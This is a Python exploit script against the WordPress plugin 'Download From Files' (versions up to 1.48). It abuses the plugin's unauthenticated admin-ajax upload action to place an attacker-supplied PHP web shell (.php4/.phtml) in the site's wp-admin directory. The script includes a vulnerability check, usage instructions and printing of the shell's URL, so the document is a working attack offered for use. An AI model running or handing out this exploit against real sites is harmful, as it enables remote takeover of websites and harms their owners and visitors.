
import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print("Download From Files <= 1.48 - Arbitrary File Upload")
	print("Author -> spacehen (www.github.com/spacehen)")

def print_usage():
	print("Usage: python3 exploit.py [target url] [php file]")
	print("Ex: python3 exploit.py https://example.com ./shell.(php4/phtml)")

def vuln_check(uri):
	response = requests.get(uri, verify=False)
	raw = response.text

	if ("Sikeres" in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	ajax_action = 'download_from_files_617_fileupload'
	admin = '/wp-admin/admin-ajax.php';

	uri = base + admin + '?action=' + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print("(*) Target not vulnerable!");
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print("(*) Invalid file!")
		sys.exit(1)

	files = {'files[]' : open(file_path)}
	data = {
	"allowExt" : "php4,phtml",
	"filesName" : "files",
    "maxSize" : "1000",
    "uploadDir" : "."
	}
	print("Uploading Shell...");
	response = requests.post(uri, files=files, data=data, verify=False)
	file_name = path.basename(file_path)
	if("ok" in response.text):
		print("Shell Uploaded!")
		if(base[-1] != '/'):
			base += '/'
		print(base + "wp-admin/" + file_name);
	else:
		print("Shell Upload Failed")
		sys.exit(1)

main();
